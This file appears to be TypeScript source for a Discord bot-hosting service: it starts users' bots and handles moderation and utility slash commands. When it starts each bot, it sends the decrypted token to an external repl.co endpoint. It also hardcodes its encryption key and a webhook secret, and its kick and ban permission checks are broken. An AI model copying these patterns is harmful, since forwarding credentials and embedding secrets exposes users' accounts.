import MemberJoinHandler from './handlers/member-join.handler';
import MemberLeaveHandler from './handlers/member-leave.handler';
import MessageDeleteHandler from './handlers/message-deleted.handler';
import EventHandler from './handlers/event-handler';
import ReadyHandler from './handlers/ready.handler';
import MessageReactionAddHandler from './handlers/messageReactionAdd.handler';
import GuildCreateHandler from './handlers/guildCreate.handler';
import MessageHandler from './handlers/message.handler';
import Deps from '../utils/deps';
import Bots from '../data/bots';
import webhook from 'webhook-discord';

import wiki from "wikijs";
import CryptoJS, { AES } from 'crypto-js';
import Log from '../utils/log';
import db from 'quick.db';
import googleTranslate from "@iamtraction/google-translate";
import Members from '../data/members';
import { create, all } from "mathjs";
import { codeBlock } from "@discordjs/builders";
import { MemberDocument } from '../data/models/member';
import { Client, Intents, Collection, MessageEmbed } from 'discord.js';
import { SavedBot } from '../data/models/bot';
 import GlobalBots from '../global-bots';
import { promisify } from 'util';
import { resolve } from 'path';
import fs from 'fs';
import ms from 'ms';
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v9');
const { SlashCommandBuilder } = require('@discordjs/builders');
import AutoMod from '../modules/auto-mod/auto-mod';
import CommandUtils from '../utils/command-utils';
import fetch from 'node-fetch';
export default class EventsService {
    private readonly handlers: EventHandler[] = [
        new ReadyHandler(),
        new GuildCreateHandler(),
        new MessageHandler(),
        new MemberJoinHandler(),
        new MemberLeaveHandler(),
        new MessageDeleteHandler(),
        new MessageReactionAddHandler()
    ];

    constructor(private bots = Deps.get<Bots>(Bots),
                private autoMod = Deps.get<AutoMod>(AutoMod),
                private members = Deps.get<Members>(Members)) {}

    async init() {
        const savedBots = await this.bots.getAll();
         
     
      
       
     
        let loggedInCount = 0;
        for (const { tokenHash } of savedBots) {
            const token = AES
                .decrypt(tokenHash || '', "JKGNFDNBIOFNBOGN")
                .toString(CryptoJS.enc.Utf8);
            const isValidToken = /^[A-Za-z\d]{24}\.[A-Za-z\d-]{6}\.[A-Za-z\d-_]{27}$/.test(token);
            if (!isValidToken) continue;
            
            try {
                        
                await this.startBot(token);
                loggedInCount++;
            } catch(error) {
                Log.error(`Invalid bot token.`, 'events');
             
                await SavedBot.deleteOne({ tokenHash });
             
            }
        }
        Log.info(`Logged in ${loggedInCount} bots`, 'events');
    }

    async startBot(token: string) {
           var requestOptions = {
  method: 'POST', // Choose the appropriate method
  headers: {
    'auth': 'HIUGHIHFIUHUIUIGUIGUYGYUSDYFCG',
    'Content-Type': 'application/json',
  },
  body:  JSON.stringify({
     "token": `${token}`,
   
     }), // Replace this number with the server count
};
          fetch("https://Music-bot.dhvitop.repl.co/login", requestOptions) 
        const bot = new Client({ intents: [
				Intents.FLAGS.GUILDS,
				Intents.FLAGS.GUILD_MEMBERS,
				Intents.FLAGS.GUILD_MESSAGES,
				Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
				Intents.FLAGS.GUILD_VOICE_STATES,
				Intents.FLAGS.DIRECT_MESSAGES
            
			],
                               partials: ['MESSAGE', 'CHANNEL', 'REACTION', 'USER'], allowedMentions: {
				parse: ["users"]
			} });
       
    
            bot.guilds.cache.forEach(async(guild) => {
               await guild.members.fetch();
            })
            


       
        const handler = this.handlers[0];
        bot.on('ready', () => handler.invoke(bot));
      /*  bot.on('guildCreate', async (guild) => {
             await guild.members.fetch();
        }) 
        bot.on('ready', async() => {
            bot.guilds.cache.forEach(async(guild) => {
                await guild.members.fetch();
                
            })
        }) */
      bot.on('interactionCreate', async interaction => {
	if (!interaction.isCommand()) return;
     let ctx = interaction;
	if (interaction.commandName === 'ping') {
		await interaction.reply('Pong!');
	}
          if (interaction.commandName === 'flip') {
   const result = (Math.random() >= 0.5) ? 'Heads' : 'Tails';
		await interaction.reply(`${result}`);

	}
          if (interaction.commandName === 'help') {
       const embed = new MessageEmbed()
 .setTitle('Commands List')
       .addField('Moderation', '`warn`, `warnings`, `ban`, `clear`, `kick`, `lock`, `unlock`, `prefix`, `say`, `poll`, `announce`', true)
       .addField('Verification', '`verification`, `verify`')
       .addField("Custom Commands", '`cc-create`, `cc-delete`', true)
       .addField("Anti Link", "`antilink-enable`, `antilink-disable`", true)
       .addField('Auto Role', '`auto-role`', true)
        .addField("Anti Swear", "`anti-swear`", true)
       .addField('Welcome and Leave', '`welcome`, `leave`', true)
       .addField('General', '`help`, `ping`, `invite`, `stats`, `weather`', true)
       .addField('Utility', '  `flip`, `roleinfo`, `serverinfo`, `afk`, `avatar`, `calc`, `translate`, `wiki`, `remind`, `messages`', true)
       .addField('Economy', '`balance`', true)
        .addField('Music', '`play`, `skip`, `queue`, `shuffle`, `resume`, `pause`, `volume`, `stop`, `np`, `lyrics`', true)
       .addField('Bot Customization', '`create`, `delete`, `status`, `stop`, `start`', true)
        .setFooter('Music Coming Soon');

      
		await interaction.reply({embeds: [embed]});

	}
          if(interaction.commandName === 'delete')
              {
                  const botid = interaction.options.getString('botid');
                  if(bot.user.id != botid)
                      {
                          await interaction.reply("Delete your bot from your own bot command");
                          return;
                      }
                  const breh = await this.bots.get(bot.user);
                  if(!breh)
                      {
                      await interaction.reply("Give me a valid bot id");
                          return;
                      }
                    if(breh.ownerId != interaction.member.id)
                {
                       let embed1 = new MessageEmbed()
          .setDescription(`You are not the Owner of This Bot!`)
          .setColor('RED');
                    await interaction.reply({embeds: [embed1]});
                    return;
                }
                  var requestOptions = {
  method: 'POST', // Choose the appropriate method
  headers: {
     'auth': 'HIUGHIHFIUHUIUIGUIGUYGYUSDYFCG',
    'Content-Type': 'application/json',
  },
  body:  JSON.stringify({
     "botid": `${bot.user.id}`,
   
     }), // Replace this number with the server count
};
          fetch("https://Music-bot.dhvitop.repl.co/delete", requestOptions) 
                       var Hook = new webhook.Webhook("https://discord.com/api/webhooks/885892065207144468/gJzPQNHJ2qR_IKEKvH6u_DqQGJjqQM2wYBZJNPpFc1PwXUF5uW0iAbvIXcNZVrzNSKDf");
                     let embed2 = new MessageEmbed()
          .setDescription(`Successfully Deleted Your Bot!`)
                     .setFooter(`You can Re-Create your bot using /create`)
          .setColor('GREEN');
              var msgxd = new webhook.MessageBuilder()
              .setName("Logger")
               .setText(`${bot.user.tag} Got Deleted By ${interaction.member.user.tag}`);
                  Hook.send(msgxd);
                  await interaction.reply({embeds: [embed2]}).then(async (xdms) => {
                       await bot.destroy();
            await this.bots.delete(botid);
                  })
             
                  
                    
                  
                  
              }
          if(db.has(`${interaction.commandName}_${bot.user.id}`))
              {
                  let gettingthings = db.fetch(`${interaction.commandName}_${bot.user.id}`);
                  if(gettingthings.option === "embed")
                      {
                       const xdemb = new MessageEmbed()
                  
                       .setDescription(gettingthings.normaltext)
                       await interaction.reply({embeds: [xdemb]});
                          return;
                      }
                  if(gettingthings.option === "text")
                      {
                          await interaction.reply(gettingthings.normaltext);
                          return;
                      }
              }
          if(interaction.commandName === 'slash-create')
              {
                  const commandnamexd = interaction.options.getString('command_name');
                  const commanddesxd = interaction.options.getString('command_description');
                  const cmdoption = interaction.options.getString('option');
                 
                  
                  const normtext = interaction.options.getString('command_response_text');
                  
                  const brehxdxdxd = await this.bots.get(bot.user);
                                      if(brehxdxdxd.ownerId != interaction.member.id)
                {
                    await interaction.reply("You should be owner of this bot");
                    return;
                }
                  if(cmdoption != "embed" && cmdoption != "text")
                      {
                          await interaction.reply("Give a an option of embed or text choose one of them");
                          return;
                      }
                  if(commandnamexd === "ban" || commandnamexd === "kick" || commandnamexd === "mute" || commandnamexd === "unmute" || commandnamexd === "warn" || commandnamexd === "warnings" || commandnamexd === "kick" || commandnamexd === "clear" || commandnamexd === "lock" || commandnamexd === "unlock" || commandnamexd === "prefix" || commandnamexd === "say" || commandnamexd === "poll" || commandnamexd === "announce" || commandnamexd === "verification" || commandnamexd === "verify" || commandnamexd === "cc-create" || commandnamexd === "cc-delete" || commandnamexd === "antilink" || commandnamexd === "antilink-enable" || commandnamexd === "antilink-disable" || commandnamexd === "autorole" || commandnamexd === "anti-swear" || commandnamexd === "welcome" || commandnamexd === "leave" || commandnamexd === "help" || commandnamexd === "ping" || commandnamexd === "invite" || commandnamexd === "stats" || commandnamexd === "create" || commandnamexd === "flip" || commandnamexd === "role" || commandnamexd === "server" || commandnamexd === "afk" || commandnamexd === "avatar" || commandnamexd === "calc" || commandnamexd === "wiki" || commandnamexd === "weather" || commandnamexd === "translate" || commandnamexd === "remind" || db.has(`${commandnamexd}_${bot.user.id}`))
                      {
                          await interaction.reply("This Command is Already Registered Please Choose a new name or Delete That Command");
                          return;
                      }
                if(!normtext)
                    {
                        await interaction.reply("Give a Text for Response");
                        return;
                    }
                  
                  var commandxd = {
                      
                      cmdname: commandnamexd,
                      cmddesc: commanddesxd,
                     option: cmdoption,
                    
                     normaltext: normtext
                  }
                  const cmdbuh = [];
                  
                  var data = new SlashCommandBuilder()
	.setName(commandnamexd)
	.setDescription(commanddesxd)
                   cmdbuh.push(data);
         
                  
     const readdir = promisify(fs.readdir);

    

    const directory = resolve(`./src/commands`);

        const files = await readdir(directory);

        

        for (const file of files) {            

            const { default: Command } = await import(`../commands/${file}`);

            if (!Command) continue;

            

            const command = new Command();

          

         if(command.options && command.options[0])

         {

 

var data = new SlashCommandBuilder()

	.setName(command.name)

	.setDescription(command.summary)

	 switch (command.options[0]) {

        case "String":

            data.addStringOption(option => 

              option.setName(command.optionsname[0])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

        case "Channel":

            data.addChannelOption(option => 

              option.setName(command.optionsname[0])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "User":

            data.addUserOption(option => 

              option.setName(command.optionsname[0])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "Role":

            data.addRoleOption(option => 

              option.setName(command.optionsname[0])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

        default:

    }

   

    if(command.options[1])

        {

            switch (command.options[1]) {

        case "String":

            data.addStringOption(option => 

              option.setName(command.optionsname[1])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

        case "Channel":

            data.addChannelOption(option => 

              option.setName(command.optionsname[1])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "User":

            data.addUserOption(option => 

              option.setName(command.optionsname[1])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "Role":

            data.addRoleOption(option => 

              option.setName(command.optionsname[1])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

        default:

    }

        }

               if(command.options && command.options[2])

        {

             switch (command.options[2]) {

        case "String":

            data.addStringOption(option => 

              option.setName(command.optionsname[2])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

        case "Channel":

            data.addChannelOption(option => 

              option.setName(command.optionsname[2])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "User":

            data.addUserOption(option => 

              option.setName(command.optionsname[2])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "Role":

            data.addRoleOption(option => 

              option.setName(command.optionsname[2])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

        default:

    }

            

        } 

              if(command.options && command.options[3])

        {

             switch (command.options[3]) {

        case "String":

            data.addStringOption(option => 

              option.setName(command.optionsname[3])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

        case "Channel":

            data.addChannelOption(option => 

              option.setName(command.optionsname[3])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "User":

            data.addUserOption(option => 

              option.setName(command.optionsname[3])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "Role":

            data.addRoleOption(option => 

              option.setName(command.optionsname[3])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

        default:

    }

            

        }

              if(command.options && command.options[4])

        {

             switch (command.options[4]) {

        case "String":

            data.addStringOption(option => 

              option.setName(command.optionsname[4])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

        case "Channel":

            data.addChannelOption(option => 

              option.setName(command.optionsname[4])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "User":

            data.addUserOption(option => 

              option.setName(command.optionsname[4])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "Role":

            data.addRoleOption(option => 

              option.setName(command.optionsname[4])

			.setDescription('Description Not Available')

                          

			.setRequired(true));

            break;

        default:

    }

            

        } 

                   if(command.options && command.options[5])

        {

             switch (command.options[5]) {

        case "String":

            data.addStringOption(option => 

              option.setName(command.optionsname[5])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

        case "Channel":

            data.addChannelOption(option => 

              option.setName(command.optionsname[5])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "User":

            data.addUserOption(option => 

              option.setName(command.optionsname[5])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "Role":

            data.addRoleOption(option => 

              option.setName(command.optionsname[5])

			.setDescription('Description Not Available')

                          

			.setRequired(true));

            break;

        default:

    }

            

        } 

                   if(command.options && command.options[6])

        {

             switch (command.options[6]) {

        case "String":

            data.addStringOption(option => 

              option.setName(command.optionsname[6])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

        case "Channel":

            data.addChannelOption(option => 

              option.setName(command.optionsname[6])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "User":

            data.addUserOption(option => 

              option.setName(command.optionsname[6])

			.setDescription('Description Not Available')

			.setRequired(true));

            break;

                      case "Role":

            data.addRoleOption(option => 

              option.setName(command.optionsname[6])

			.setDescription('Description Not Available')

                          

			.setRequired(true));

            break;

        default:

    }

            

        } 

             

}

          else {

             var data = new SlashCommandBuilder()

        .setName(command.name)

	.setDescription(command.summary)

         }

          

         

            

       cmdbuh.push(data);

        }
                     let embed3 = new MessageEmbed()
          .setDescription(`Successfully Created Custom Slash Command!`)
          .setColor('RED');
                  db.set(`${commandnamexd}_${bot.user.id}`, commandxd)
                 await interaction.reply("Your Custom Slash Command have been Created");
                   const token = AES
                .decrypt(brehxdxdxd.tokenHash || '', "JKGNFDNBIOFNBOGN")
                .toString(CryptoJS.enc.Utf8);
                     var rest = new REST({ version: '9' }).setToken(token);
              
    try {
		console.log('Started refreshing application (/) commands.');

		await rest.put(
			Routes.applicationCommands(bot.user.id),
	{ body: cmdbuh },
		);

		console.log('Successfully reloaded application (/) commands.');
        
	} catch (error) {
		await interaction.reply({content: error, ephemeral: true});
        return;
	}
            
        
              }
          if(interaction.commandName === 'warn')
              {
              const reason = interaction.options.getString('reason');
                const user = interaction.options.getMember('user');
                    if(!interaction.member.permissions.has("MANAGE_GUILD"))
                      {
                          await interaction.reply({content: "You don't have permission to use this Command", ephemeral: true});
                          return;
                      }
                   await this.autoMod.warn(user, interaction.member, reason);
                  await interaction.reply(`<@${user.id}> Has Been Warned by <@${interaction.member.id}> for ${reason}`)
              }
          if(interaction.commandName === 'warnings')
              {
                  await interaction.deferReply();
                    const user = interaction.options.getMember('user');
                  
                   if(!interaction.member.permissions.has("VIEW_AUDIT_LOG"))
                      {
                          await interaction.editReply("You Dont have permission to use this Command");
                          return;
                      }
                  const savedMember = await this.members.get(user);
                 
                  
                  await interaction.editReply(`User has \`${savedMember.warnings.length}\` warnings.`)
              }
          
          if(interaction.commandName === 'role')
              {
                  const role = interaction.options.getRole('role');
                  const emojiBoolean = (condition) => condition ? '✅' : '❌';
                   const embed = new MessageEmbed()
.setTitle(`@${role.name}`)

   embed.addFields(

        { name: 'ID', value: `\`${role.id}\``, inline: true },

        { name: 'Created', value: `\`${role.createdAt.toDateString()}\``, inline: true },

        { name: 'Position', value: `\`${role.position}\``, inline: true },

        { name: 'Members', value: `\`${role.members.size}\``, inline: true },

        { name: 'Mentionable', value: emojiBoolean(role.mentionable), inline: true },

        { name: 'Hoisted', value: emojiBoolean(role.hoist), inline: true },

        { name: 'Managed', value: emojiBoolean(role.managed), inline: true },

      );

    embed.setThumbnail(interaction.guild.iconURL());
                  await interaction.reply({embeds: [embed]});
              }
          if(interaction.commandName === 'server')
              {
                   const embed = new MessageEmbed()
       await interaction.guild.members.fetch(); 
      embed.setTitle(`**__${interaction.guild.name}__**`)

      embed.addFields(

        { name: 'Channels', value: `\`${interaction.guild.channels.cache.size}\``, inline: true },

        { name: 'Created', value: `\`${interaction.guild.createdAt.toDateString()}\``,  inline: true },

        { name: 'ID', value: `\`${interaction.guild.id}\``, inline: true },

        { name: 'Members', value: `\`${interaction.guild.members.cache.size}\``, inline: true },

        { name: 'Owner', value: `<@!${interaction.guild.ownerId}>`, inline: true },

        { name: 'Roles', value: `\`${interaction.guild.roles.cache.size}\``, inline: true }

      );

      

    embed.setThumbnail(interaction.guild.iconURL())
                  await interaction.reply({embeds: [embed]});
              }
          if(interaction.commandName === 'prefix')
              {
              const prefix = interaction.options.getString('prefix');
                  let chek = db.fetch(`prefix_${interaction.guild.id}_${bot.user.id}`);
                      if(!interaction.member.permissions.has("MANAGE_GUILD"))
                      {
                          await interaction.reply({content: "You Dont have permission to use this Command", ephemeral: true});
                          return;
                      }
                    if(chek === prefix)
      {
          await interaction.reply("You have to give a new Prefix this Prefix is already being used");
        return;
      }
                       var requestOptions = {
  method: 'POST', // Choose the appropriate method
  headers: {
     'auth': 'HIUGHIHFIUHUIUIGUIGUYGYUSDYFCG',
    'Content-Type': 'application/json',
  },
  body:  JSON.stringify({
     "prefix": `${prefix}`,
     "botid": `${bot.user.id}`,
       "guildid": `${interaction.guild.id}`,
     }), // Replace this number with the server count
};
          fetch("https://Music-bot.dhvitop.repl.co/prefix", requestOptions) 
                 let embed4 = new MessageEmbed()
          .setDescription(`Successfully changed Prefix`)
          .setColor('GREEN');    
      db.set(`prefix_${interaction.guild.id}_${bot.user.id}`, prefix);
         await interaction.reply({embeds: [embed4]});
              }
           if(interaction.commandName === 'invite')
               {
                   await interaction.reply(`https://discord.com/oauth2/authorize?client_id=${bot.user.id}&permissions=8&scope=bot%20applications.commands`);
               }
            if(interaction.commandName === 'avatar')
               {
                   let user = bot.users.cache.get(interaction.member.id);
                    const png = this.getAvatar(user, "png");
    const webp = this.getAvatar(user, "webp");
    const jpg = this.getAvatar(user, "jpg");
    const gif = this.getAvatar(user, "gif");
                    const embed = new MessageEmbed()
      .setTitle(`${user.username}`)
      .setDescription(`[png](${png}) | [webp](${webp}) | [jpg](${jpg}) | [gif](${gif})`)
      .setImage(`${webp}`);
                   await interaction.reply({embeds: [embed]});
               }
          if(interaction.commandName === 'afk')
              {
                  const reason = interaction.options.getString('reason');
                   if(db.has(`afk_${interaction.member.id}_${bot.user.id}_${interaction.guild.id}`))
      {
       await interaction.reply("You are already afk");
          return;
      }
                 db.set(`afk_${interaction.member.id}_${bot.user.id}_${interaction.guild.id}`, reason);
                  await interaction.reply(`Done You are now afk Reason - ${reason}`)
              }
          if(interaction.commandName === 'calc')
              {
                  const calcxd = interaction.options.getString('calculation');
                    const math = create(all);
      
      const result = math?.evaluate?.(calcxd);
       const embed = new MessageEmbed()
      .setTitle("Calculation")
      .addField("Calculation", codeBlock("js", calcxd))
      .addField("Result", codeBlock("js", result));
                  await interaction.reply({embeds: [embed]});
              }
          if(interaction.commandName === 'poll')
              {
                  const question = interaction.options.getString('statement');
                     if(!interaction.member.permissions.has("MANAGE_GUILD"))
                      {
                          await interaction.reply({content: "You Dont have permission to use this Command", ephemeral: true});
                          return;
                      }

    const embed = new MessageEmbed()
      .setTitle(`Created By ${interaction.user.tag}`)
      .setDescription(question);
      embed.footer = null;
                  await interaction.reply({content: "Your poll has been sent", ephemeral: true})
        return interaction.channel.send({embeds: [embed]}).then(msg => {
       msg.react("👍");
     msg.react("👎");
      msg.react("🤷");
        })
              }
          if(interaction.commandName === 'reminder')
              {
                  const time = interaction.options.getString('time');
                  const reason = interaction.options.getString('reason');
                    if(ms(time) > ms("1w")){

 
         await interaction.reply("Give me a time which is lower than 1 week (1w)");
                        return;
        }
                  await interaction.reply("Done Your Reminder has been set i will remind you whenever it goes off");
                   setTimeout(async() => {
        interaction.user.send(`Your time for ${reason} of ${time} has been completed`);
        }, ms(time))
              }
          if(interaction.commandName === 'cc-create')
              {
                  const name = interaction.options.getString('command_name');
                  const response = interaction.options.getString('command_response');
                     if(!interaction.member.permissions.has("MANAGE_GUILD"))
                      {
                          await interaction.reply({content: "You Dont have permission to use this Command", ephemeral: true});
                          return;
                      }
                   db.set(`${name}_${bot.user.id}_${interaction.guild.id}`, response);
                  await interaction.reply("Ok now i will send your given response whenever some triggers your given command name");
              }
          if(interaction.commandName === 'cc-delete')
              {
                  
                  const name = interaction.options.getString('command_name');
                    if(!interaction.member.permissions.has("MANAGE_GUILD"))
                      {
                          await interaction.reply({content: "You Dont have permission to use this Command", ephemeral: true});
                          return;
                      }
                    if(db.has(`${name}_${bot.user.id}_${ctx.guild.id}`))
        {
               let embed5 = new MessageEmbed()
          .setDescription(`Successfully Deleted your Custom Command`)
          .setColor('RED');
            db.delete(`${name}_${bot.user.id}_${ctx.guild.id}`);
             return ctx.reply("Deleted Your Custom Command");
         } else {
                let embed6 = new MessageEmbed()
          .setDescription(`This Command does not exist `)
          .setColor('RED');
         return ctx.reply("This Command Doesn't Exist in Database");
         }
              }
          if(interaction.commandName === 'antilink-disable')
              {
                    if(!interaction.member.permissions.has("MANAGE_GUILD"))
                      {
                          await interaction.reply({content: "You Dont have permission to use this Command", ephemeral: true});
                          return;
                      }
                   db.delete(`antilink_${ctx.guild.id}_${bot.user.id}`);
                  await interaction.reply({content: "Done Disabled Anti Link", ephemeral: true});
              }
          if(interaction.commandName === 'antilink-enable')
              {
                    if(!interaction.member.permissions.has("MANAGE_GUILD"))
                      {
                          await interaction.reply({content: "You Dont have permission to use this Command", ephemeral: true});
                          return;
                      }
                       db.set(`antilink_${ctx.guild.id}_${bot.user.id}`, true);
                  await interaction.reply({content: "Done Enabled Anti Link", ephemeral: true});
              }
          if(interaction.commandName === 'anti-swear')
              {
                  const option = interaction.options.getString('option');
                    if(!interaction.member.permissions.has("MANAGE_GUILD"))
                      {
                          await interaction.reply({content: "You Dont have permission to use this Command", ephemeral: true});
                          return;
                      }
                  if(option === 'enable')
                      {
                             let embed7 = new MessageEmbed()
          .setDescription(`Successfully Enabled Anti-Swear`)
          .setColor('GREEN');
                    db.set(`anti-swear_${ctx.guild.id}_${bot.user.id}`, true);
                  await interaction.reply({embeds: [embed7]});
                      }
                 else if(option === 'disable')
                      {
                             let embed8 = new MessageEmbed()
          .setDescription(`Successfully Disabled Anti-Swear`)
          .setColor('RED');
                          db.delete(`anti-swear_${ctx.guild.id}_${bot.user.id}`);
                          await interaction.reply({embeds: [embed8]});
                      }
                  else {
                      await interaction.reply("Give a option from enable or disable");
                  }
              }
          if(interaction.commandName === 'translate')
              {
                  const language = interaction.options.getString('language');
                  const sentence = interaction.options.getString('sentence');
                  try {
                   const result = await googleTranslate(sentence, { to: language });
                
      const embed = new MessageEmbed()
      .setDescription(result.text)
      .setTitle(`Result of Translation`);
                  await interaction.reply({embeds: [embed]});
                        } catch (error)
                      {
                          await interaction.reply("This Language does not exist");
                      }
              }
          if(interaction.commandName === 'verification')
              {
                    if(!interaction.member.permissions.has("MANAGE_GUILD"))
                      {
                          await interaction.reply({content: "You Dont have permission to use this Command", ephemeral: true});
                          return;
                      }
                  const option = interaction.options.getString('option');
                  const role = interaction.options.getString('role');
                  if(option === 'enable')
                      {
                             let embed9 = new MessageEmbed()
          .setDescription(`Successfully Set Verification Role`)
          .setColor('GREEN');
                   db.set(`verification_${ctx.guild.id}_${bot.user.id}`, role.id);
                  await interaction.reply({embeds: [embed9]});
                      } else if (option === 'disable'){
                             let embed10 = new MessageEmbed()
          .setDescription(`Successfully Disabled Verification System`)
          .setColor('RED');
                          db.delete(`verification_${ctx.guild.id}_${bot.user.id}`);
                          await interaction.reply({embeds: [embed10]});
                      } else {
                          interaction.reply("Give me a valid option of enable or disable");
                      }
              }
          if(interaction.commandName === 'verify')
              {
                   let rolexd = db.fetch(`verification_${ctx.guild.id}_${bot.user.id}`);
          if(!rolexd)
        {
               let embed11 = new MessageEmbed()
          .setDescription(`Verification Procces is not enabled in this Server\n Contact Administrator `)
          .setColor('RED');
            await interaction.reply({embeds: [embed11], ephemeral: true})
        return;
        }
         if (interaction.member?.roles.cache.has(rolexd)) {
             await interaction.reply({content: "You already have verified role", ephemeral: true});
          return;
        }
        interaction.member?.roles.add(rolexd);

                  await interaction.reply({content: `You have been Successfully Verified in ${interaction.guild.name}`, ephemeral: true});
     
              }
          if(interaction.commandName === 'wiki')
              {
                  const sent = interaction.options.getString('anything');
                        const search = await wiki().search(sent);
      if (!search.results[0]) {
          await interaction.reply("No results Found");
      return;
    }
     const result = await wiki().page(search.results[0]);
     const description = await result.summary();

    const title = result.raw.title;
    const url = result.raw.fullurl;
     const embed = new MessageEmbed()
      .setTitle(`${title} (Read More)`)
      .setURL(url)
      .setDescription(`${description.slice(0, 2045)}${description.length > 2048 ? "..." : ""}`);
                  await interaction.reply({embeds: [embed]});
              }
          if(interaction.commandName === 'announce')
              {
                  const statement = interaction.options.getString('statement');
                    if(!interaction.member.permissions.has("MANAGE_GUILD"))
                      {
                          await interaction.reply({content: "You Dont have permission to use this Command", ephemeral: true});
                          return;
                      }
                  const embed = new MessageEmbed()
       .setTitle("Announcement")
       .setDescription(`**${statement}**`)
       
       await interaction.reply({content: "Announcement Has Been Sent", ephemeral: true})
        return interaction.channel.send({embeds: [embed]});
              }
          if(interaction.commandName === 'ban')
              {
                      const user = interaction.options.getMember('user');
                  const reason = interaction.options.getString('reason');
                      if(!user)
                          {
                              await interaction.reply("Give me a valid Member to ban");
                              return;
                          }
                  let member = interaction.member;
                  if(!member.permissions.has("BAN_MEMBERS"))
                      {
                          await interaction.reply({content: "You Dont have permission to ban People", ephemeral: true});
                          return;
                      }
                  if (interaction.user.id === user.id)
     {
          await interaction.reply("You cannot Ban Yourself");
         return;
     }

    const instigatorMember = interaction.guild.members.cache
      .get(user.id);    
    if (instigatorMember.roles.highest.position <= user.roles.highest.position)
      {
        await interaction.reply("User has the same or higher role.");
          return;
      }
                  if(!interaction.guild.me.permissions.has("BAN_MEMBERS"))
                      {
                          await interaction.reply("Give me Ban Members Permission");
                          return;
                      }
                    user.ban({ reason });
                  await interaction.reply("User has been banned");
              }
              if(interaction.commandName === 'clear')
              {
                      
                    await interaction.deferReply({ ephemeral: true });
                  let member = interaction.member;
                  if(!member.permissions.has("MANAGE_MESSAGES"))
                      {
                          await interaction.editReply({content: "You Dont have permission to Use this Command", ephemeral: true});
                          return;
                      }
               

   
                  if(!interaction.guild.me.permissions.has("MANAGE_MESSAGES"))
                      {
                          await interaction.reply("Give me Manage Messages Permission");
                          return;
                      }
                  const count = '100';
                      
                  const msgs = await interaction.channel.bulkDelete(+count);
                 await interaction.editReply({content: `Deleted \`${msgs.size}\` messages`, ephemeral: true});
                  
               
              }
             if(interaction.commandName === 'lock')
              {
                      
                    await interaction.deferReply();
                  let member = interaction.member;
                  if(!member.permissions.has("MANAGE_CHANNELS"))
                      {
                          await interaction.editReply("You Dont have permission to Use this Command");
                          return;
                      }
                   //const channel = bot.channels.cache.get(interaction.channel.id);
                 
                  if(!interaction.guild.me.permissions.has("MANAGE_CHANNELS"))
                      {
                          await interaction.editReply("Give me Manage Channels Permission");
                          return;
                      }
                      
                   await interaction.channel.permissionOverwrites.set([
      {
        id: interaction.guild.roles.everyone.id,
        type: 'role',
        deny: ['SEND_MESSAGES'],
      },
    ], 'Channel locked');
                 await interaction.editReply(`Successfully locked this channel!`);
                  
               
              }
             if(interaction.commandName === 'unlock')
              {
                      
                    await interaction.deferReply();
                  let member = interaction.member;
                  if(!member.permissions.has("MANAGE_CHANNELS"))
                      {
                          await interaction.editReply("You Dont have permission to Use this Command");
                          return;
                      }
                   //const channel = bot.channels.cache.get(interaction.channel.id);
                  
                      
                  if(!interaction.guild.me.permissions.has("MANAGE_CHANNELS"))
                      {
                          await interaction.editReply("Give me Manage Channels Permission");
                          return;
                      }
                   

    
                  if(!interaction.guild.me.permissions.has("MANAGE_CHANNELS"))
                      {
                          await interaction.reply("Give me Manage Channels Permission");
                          return;
                      }
                   await interaction.channel.permissionOverwrites.set([
      {
        id: interaction.guild.roles.everyone.id,
        type: 'role',
        allow: ['SEND_MESSAGES'],
      },
    ], 'Channel locked');
                 await interaction.editReply(`Successfully Unlocked this Channel`);
                  
               
              }
          if(interaction.commandName === 'kick')
              {
                      const user = interaction.options.getMember('user');
                  const instantxd

 = bot.guilds.cache.get(interaction.guild.id)
                  const instigatorMember = instantxd.members.cache.get(interaction.member.id);
                  const reason = interaction.options.getString('reason');
                      if(!user)
                          {
                              await interaction.reply("Give me a valid Member to kick");
                              return;
                          }
                  let member = interaction.member;
                  if(!member.permissions.has("KICK_MEMBERS"))
                      {
                          await interaction.reply({content: "You Dont have permission to kick People", ephemeral: true});
                          return;
                      }
                    if (interaction.user.id === user.id)
     {
          await interaction.reply("You cannot Kick Yourself");
         return;
     }

    
    if (instigatorMember.roles.highest.position <= user.roles.highest.position)
      {
        await interaction.reply("User has the same or higher role.");
          return;
      }
                  if(interaction.guild.me.permissions.has("KICK_MEMBERS"))
                      {
                          await interaction.reply("Give me Kick Members Permission");
                          return;
                      }
                    user.kick({ reason });
                  await interaction.reply("User has been Kicked");
              }
          if(interaction.commandName === 'stats')
              {
                  const embed = new MessageEmbed()
//const duration = moment.duration(ctx.bot.uptime).format(" D [days], H [hrs], m [mins], s [secs]");
      embed.setTitle(`${bot.user.username} Stats`);
 
      embed.addFields(

        { name: 'Guilds', value: `\`${bot.guilds.cache.size}\``, inline: true },

        { name: 'Users', value: `\`${bot.users.cache.size}\``, inline: true },

        { name: 'Channels', value: `\`${bot.channels.cache.size}\``, inline: true },

        { name: 'Created At', value: `\`${bot.user.createdAt.toDateString()}\``, inline: true }

       

       

      );

    
    await interaction.reply({embeds: [embed]});
              }
